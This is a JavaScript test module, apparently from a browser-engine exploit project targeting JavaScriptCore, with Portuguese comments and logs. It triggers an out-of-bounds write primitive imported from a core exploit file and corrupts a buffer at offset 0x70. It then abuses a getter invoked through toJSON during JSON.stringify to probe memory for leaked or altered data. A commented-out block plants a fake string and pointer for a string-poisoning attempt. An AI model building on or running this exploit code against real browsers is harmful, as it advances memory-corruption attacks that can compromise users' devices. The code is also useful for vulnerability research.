// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
// REMOVIDO: advancedInt64ArrayToString da importação. Adicionado: stringToAdvancedInt64Array (necessário)
import { AdvancedInt64, toHex, stringToAdvancedInt64Array } from '../utils.mjs'; 
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_dataview_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

const GETTER_CHECKPOINT_PROPERTY_NAME = "AAAA_GetterForStringifierLeak"; // Mantendo o nome do último teste funcional
let getter_called_flag = false;
let current_test_results = {
    success: false, message: "Teste não iniciado.", error: null,
    oob_writes_detected: [], 
    stringifier_output_length: 0, details: ""
};

const CORRUPTION_OFFSET_TRIGGER = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70
const CORRUPTION_VALUE_TRIGGER = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);

const OOB_AB_FILL_PATTERN_U32 = 0xCDCDCDCD;
const OOB_AB_SNOOP_AREA_BYTES = 0x800; 

let global_target_object_for_leak; 
const FAKE_STRING_DATA_OFFSET = 0x100; 
const FAKE_STRING_POINTER_VAL = new AdvancedInt64(FAKE_STRING_DATA_OFFSET, 0);
const ACTUAL_FAKE_STRING = "====TARGET_STRING_LEAKED_SUCCESSFULLY====";

class CheckpointForStringifierLeakExploit { // Nome da classe do último teste
    constructor(id) {
        this.id_marker = `StrLeakExploitChkpt-${id}`;
        this.prop_to_leak_via_stringify = null; 
        this.other_data = "PAD_" + "X".repeat(32) + "_PAD";
    }

    get [GETTER_CHECKPOINT_PROPERTY_NAME]() {
        getter_called_flag = true;
        const FNAME_GETTER = "StringifierLeakExploit_Getter"; // Nome do getter do último teste
        logS3(`Getter "${GETTER_CHECKPOINT_PROPERTY_NAME}" FOI CHAMADO em 'this' (id: ${this.id_marker})!`, "vuln", FNAME_GETTER);
        
        current_test_results = { 
            success: false, message: "Getter chamado, analisando escrita do Stringifier.",
            error: null, oob_writes_detected: [], stringifier_output_length: 0, details:""
        };
        let details_log = [];
        let anomalia_detectada_na_sondagem = false;
        let internal_stringify_threw_error = false;
        let internal_stringify_error_msg = "";

        try {
            if (!oob_array_buffer_real || !oob_write_absolute || !oob_read_absolute) {
                throw new Error("Dependências OOB R/W ou oob_ab não disponíveis no getter.");
            }

            logS3("DENTRO DO GETTER: Preenchendo oob_array_buffer_real com padrão...", "info", FNAME_GETTER);
            const fill_limit = Math.min(OOB_AB_SNOOP_AREA_BYTES, oob_array_buffer_real.byteLength);
            for (let offset = 0; offset < fill_limit; offset += 4) {
                if (offset >= CORRUPTION_OFFSET_TRIGGER && offset < CORRUPTION_OFFSET_TRIGGER + 8) continue;
                try { oob_write_absolute(offset, OOB_AB_FILL_PATTERN_U32, 4); } catch(e_fill) {}
            }
            details_log.push(`oob_array_buffer_real preenchido com ${toHex(OOB_AB_FILL_PATTERN_U32)} até ${toHex(fill_limit)}.`);

            let stress_obj_internal = {
                title: "InternalStressObject",
                target_in_stress: this.prop_to_leak_via_stringify, 
                long_str_1: "Val1_" + "L".repeat(60) + "_EndVal1",
                numbers: [Math.random(), Math.random(), Date.now()],
                nested_level1: {
                    sub_str: "SubStr_" + "S".repeat(50),
                    target_again: this.prop_to_leak_via_stringify
                }
            };
            details_log.push(`Objeto de stress interno (contendo target) criado.`);

            logS3("DENTRO DO GETTER: Chamando JSON.stringify INTERNO sobre objeto de stress...", "subtest", FNAME_GETTER);
            let internal_json_out_len = 0;
            try {
                let internal_json_out_str = JSON.stringify(stress_obj_internal);
                internal_json_out_len = internal_json_out_str.length;
                details_log.push(`Stringify interno completado. Output length: ${internal_json_out_len}.`);
                logS3(`DENTRO DO GETTER: JSON.stringify interno completado. Output length: ${internal_json_out_len}`, "info", FNAME_GETTER);
            } catch (e_json_int) {
                internal_stringify_threw_error = true;
                internal_stringify_error_msg = e_json_int.message;
                details_log.push(`Erro no JSON.stringify interno: ${e_json_int.message}`);
                logS3(`DENTRO DO GETTER: Erro no JSON.stringify interno: ${e_json_int.message}`, "error", FNAME_GETTER);
                if (!String(e_json_int.message).toLowerCase().includes("circular")) {
                    anomalia_detectada_na_sondagem = true; 
                    current_test_results.error = `Erro incomum stringify interno: ${e_json_int.message}`;
                }
            }
            current_test_results.stringifier_output_length = internal_json_out_len;

            logS3("DENTRO DO GETTER: Sondando oob_array_buffer_real por escritas/vazamentos...", "info", FNAME_GETTER);
            let snoop_hits_list = [];
            for (let offset = 0; (offset + 4) <= fill_limit; offset += 4) { 
                let skip_offset = false;
                if (offset >= CORRUPTION_OFFSET_TRIGGER && offset < CORRUPTION_OFFSET_TRIGGER + 8) {
                     skip_offset = true; 
                     try {
                        const val_trig_u32 = oob_read_absolute(offset, 4);
                        if (val_trig_u32 !== OOB_AB_FILL_PATTERN_U32) {
                             snoop_hits_list.push({offset: toHex(offset), value_u32: toHex(val_trig_u32), value_u64_context: "N/A (Trigger Area)", note: "Trigger Area Byte"});
                        }
                     } catch(e){}
                }
                if(skip_offset) continue;

                try {
                    const value_read_u32 = oob_read_absolute(offset, 4);
                    if (value_read_u32 !== OOB_AB_FILL_PATTERN_U32) {
                        let val64_ctx_str = "N/A";
                        if ((offset + 8) <= fill_limit) {
                            try { val64_ctx_str = oob_read_absolute(offset, 8).toString(true); } catch(e){}
                        }
                        const leak_msg = `ALTERAÇÃO oob_data[${toHex(offset)}]: ${toHex(value_read_u32)} (Padrão: ${toHex(OOB_AB_FILL_PATTERN_U32)}). Contexto 64bit: ${val64_ctx_str}`;
                        logS3(leak_msg, "leak", FNAME_GETTER);
                        snoop_hits_list.push({offset: toHex(offset), value_u32: toHex(value_read_u32), value_u64_context: val64_ctx_str, note: "Data Changed"});
                        anomalia_detectada_na_sondagem = true;
                    }
                } catch (e_snoop) {}
            }
            current_test_results.oob_writes_detected = snoop_hits_list;
            
            const actual_leaks = snoop_hits_list.filter(item => item.note === "Data Changed");
            if (actual_leaks.length > 0) {
                details_log.push(`${actual_leaks.length} DWORDS alterados (não padrão, não gatilho) encontrados.`);
                logS3(`DENTRO DO GETTER: ${actual_leaks.length} DWORDS ALTERADOS (NÃO PADRÃO) ENCONTRADOS NO OOB_AB!`, "vuln", FNAME_GETTER);
            } else {
                details_log.push("Nenhuma alteração de padrão (não gatilho) encontrada em oob_array_buffer_real.");
                 logS3("DENTRO DO GETTER: Nenhuma alteração de padrão (não gatilho) no oob_array_buffer_real.", "good", FNAME_GETTER);
            }

            if (anomalia_detectada_na_sondagem) {
                current_test_results.success = true;
                current_test_results.message = "Anomalias (escritas inesperadas em oob_ab ou erro incomum no stringify interno) detectadas!";
            } else if (internal_stringify_threw_error && String(internal_stringify_error_msg).toLowerCase().includes("circular")) {
                current_test_results.message = "Stringify interno falhou com erro de ciclo esperado. Nenhuma outra anomalia.";
            } else if (internal_stringify_threw_error) {
                 current_test_results.message = `Stringify interno falhou com: ${internal_stringify_error_msg}. Nenhuma outra anomalia.`;
            } else {
                current_test_results.message = "Nenhuma anomalia óbvia detectada ao estressar o Stringifier.";
            }
            
        } catch (e_getter_main) {
            logS3(`DENTRO DO GETTER: ERRO PRINCIPAL NO GETTER: ${e_getter_main.message}`, "critical", FNAME_GETTER);
            current_test_results.error = String(e_getter_main);
            current_test_results.message = `Erro principal no getter: ${e_getter_main.message}`;
        }
        current_test_results.details = details_log.join('; '); // Atribui details_log mesmo se houver erro
        return { "getter_processed_stringifier_leak_analysis": true };
    }

    toJSON() {
        const FNAME_toJSON = "CheckpointForStringifierLeakExploit.toJSON";
        logS3(`toJSON para: ${this.id_marker}. Acessando getter...`, "info", FNAME_toJSON);
        const _ = this[GETTER_CHECKPOINT_PROPERTY_NAME];
        return { id: this.id_marker, processed_by_str_leak_exploit_test: true };
    }
}

export async function executeRetypeOOB_AB_Test() { 
    const FNAME_TEST_RUNNER = "executeStringifierLeakAnalysisRunner"; // Mantido como na última execução de logs
    logS3(`--- Iniciando Teste de Leak via Stringifier Corrompido (Agressivo v4 - Import Fix) ---`, "test", FNAME_TEST_RUNNER);

    getter_called_flag = false;
    current_test_results = { /* Reset inicial completo */ 
        success: false, message: "Teste não executado.", error: null,
        details: "", oob_writes_detected: [], stringifier_output_length: 0
    };


    if (!JSC_OFFSETS.ArrayBufferContents || !JSC_OFFSETS.JSCell /* etc.*/) { 
        current_test_results.message = "Offsets JSC críticos ausentes.";
        logS3(current_test_results.message, "critical", FNAME_TEST_RUNNER);
        return; 
    }

    try {
        await triggerOOB_primitive();
        if (!oob_array_buffer_real || !oob_dataview_real) { 
            current_test_results.message = "OOB Init falhou.";
            logS3(current_test_results.message, "critical", FNAME_TEST_RUNNER);
            return; 
        }
        logS3(`Ambiente OOB inicializado. oob_ab_len: ${oob_array_buffer_real.byteLength}`, "info", FNAME_TEST_RUNNER);
        
        // 1. Plantar a STRING FALSA no oob_array_buffer_real (Necessário para o teste original de "Envenenamento de String")
        // Se stringToAdvancedInt64Array não estiver definida em utils.mjs, esta parte falhará ou precisará ser adaptada/removida
        // Para o teste atual (que é o Stringifier UAF/Leak Test), não estamos usando FAKE_STRING_POINTER_VAL em 0x70
        // nem ACTUAL_FAKE_STRING. A escrita em 0x70 é CORRUPTION_VALUE_TRIGGER.
        // Portanto, a lógica de plantar string aqui pode ser removida se utils.mjs estável não tem stringToAdvancedInt64Array.
        // Vou remover para evitar dependência não confirmada.
        /*
        if (typeof stringToAdvancedInt64Array === "function") {
            const strBytes = stringToAdvancedInt64Array(ACTUAL_FAKE_STRING); 
            let current_string_offset = FAKE_STRING_DATA_OFFSET;
            for (const adv64 of strBytes) {
                oob_write_absolute(current_string_offset, adv64, 8); 
                current_string_offset += 8;
            }
            logS3(`String falsa "${ACTUAL_FAKE_STRING}" plantada em oob_data[${toHex(FAKE_STRING_DATA_OFFSET)}]`, "info", FNAME_TEST_RUNNER);
            // Escrever o PONTEIRO (offset) para a string falsa em 0x70
            // oob_write_absolute(CORRUPTION_OFFSET_TRIGGER, FAKE_STRING_POINTER_VAL, 8);
            // logS3(`Escrita OOB gatilho em ${toHex(CORRUPTION_OFFSET_TRIGGER)} com PONTEIRO FALSO ${FAKE_STRING_POINTER_VAL.toString(true)} completada.`, "info", FNAME_TEST_RUNNER);
        } else {
            logS3("AVISO: stringToAdvancedInt64Array não definida em utils.mjs. Teste de envenenamento de string não pode plantar string.", "warn", FNAME_TEST_RUNNER);
            // Prosseguir com o CORRUPTION_VALUE_TRIGGER padrão para o getter
            oob_write_absolute(CORRUPTION_OFFSET_TRIGGER, CORRUPTION_VALUE_TRIGGER, 8);
            logS3(`Escrita OOB gatilho em ${toHex(CORRUPTION_OFFSET_TRIGGER)} com valor padrão completada.`, "info", FNAME_TEST_RUNNER);
        }
        */
       // Para este teste, sempre usamos CORRUPTION_VALUE_TRIGGER para acionar o getter.
        oob_write_absolute(CORRUPTION_OFFSET_TRIGGER, CORRUPTION_VALUE_TRIGGER, 8);
        logS3(`Escrita OOB gatilho em ${toHex(CORRUPTION_OFFSET_TRIGGER)} completada.`, "info", FNAME_TEST_RUNNER);


        const checkpoint_obj = new CheckpointForStringifierLeakExploit(1); // Usa a classe correta
        global_target_object_for_leak = { "secret_marker_val": 0xBADF00D + Math.floor(Math.random()*255) };
        checkpoint_obj.prop_to_leak_via_stringify = global_target_object_for_leak; // Atribui ao checkpoint obj
        logS3(`Checkpoint objeto criado: ${checkpoint_obj.id_marker}, prop_to_leak_via_stringify preenchida.`, "info", FNAME_TEST_RUNNER);
        
        logS3(`Chamando JSON.stringify(checkpoint_obj)...`, "info", FNAME_TEST_RUNNER);
        let final_json_output = "";
        try {
            final_json_output = JSON.stringify(checkpoint_obj);
            logS3(`JSON.stringify EXTERNO completado. Resultado (parcial): ${final_json_output.substring(0,200)}...`, "info", FNAME_TEST_RUNNER);
        } catch (e_json_ext) { 
            logS3(`Erro em JSON.stringify (externo): ${e_json_ext.message}`, "error", FNAME_TEST_RUNNER);
             if(!getter_called_flag && current_test_results) { 
                current_test_results.error = String(e_json_ext);
                current_test_results.message = (current_test_results.message || "") + `Erro em JSON.stringify (antes do getter): ${e_json_ext.message}`;
            }
        }

    } catch (mainError_runner) { 
        logS3(`Erro principal no runner: ${mainError_runner.message}`, "critical", FNAME_TEST_RUNNER);
        console.error(mainError_runner);
        if(current_test_results) {
            current_test_results.message = (current_test_results.message || "") + `Erro crítico no runner: ${mainError_runner.message}`;
            current_test_results.error = String(mainError_runner);
        }
    }
    finally { 
        logS3("Limpeza finalizada.", "info", "CleanupRunner");
    }

    if (getter_called_flag) {
        if (current_test_results.success) {
            logS3(`RESULTADO TESTE STRINGIFIER LEAK: SUCESSO ESPECULATIVO! ${current_test_results.message}`, "vuln", FNAME_TEST_RUNNER);
        } else {
            logS3(`RESULTADO TESTE STRINGIFIER LEAK: Getter chamado. ${current_test_results.message}`, "warn", FNAME_TEST_RUNNER);
        }
        if (current_test_results.details) {
             logS3(`  Detalhes da tentativa no getter: ${current_test_results.details}`, "info", FNAME_TEST_RUNNER);
        }
        if (current_test_results.oob_writes_detected && current_test_results.oob_writes_detected.length > 0) {
            logS3("--- Dados Alterados/Vazados no oob_array_buffer_real ---", "leak", FNAME_TEST_RUNNER);
            current_test_results.oob_writes_detected.forEach(item => {
                logS3(`  Offset ${item.offset}: U32=${item.value_u32}, Contexto U64=${item.value_u64_context} ${item.note ? '('+item.note+')':''}`, "leak", FNAME_TEST_RUNNER);
            });
        }
         if (current_test_results.error) {
            logS3(`  Erro reportado: ${current_test_results.error}`, "error", FNAME_TEST_RUNNER);
         }
    } else {
        logS3("RESULTADO TESTE STRINGIFIER LEAK: Getter NÃO foi chamado.", "error", FNAME_TEST_RUNNER);
         if (current_test_results && current_test_results.error) {
            logS3(`  Erro (provavelmente no runner ou setup): ${current_test_results.error} | Mensagem: ${current_test_results.message}`, "error", FNAME_TEST_RUNNER);
        } else if (current_test_results) {
             logS3(`  Mensagem (sem erro explícito no runner): ${current_test_results.message}`, "info", FNAME_TEST_RUNNER);
        }
    }

    clearOOBEnvironment();
    global_target_object_for_leak = null;
    logS3(`--- Teste de Leak via Stringifier Corrompido (Agressivo v4) Concluído ---`, "test", FNAME_TEST_RUNNER);
}
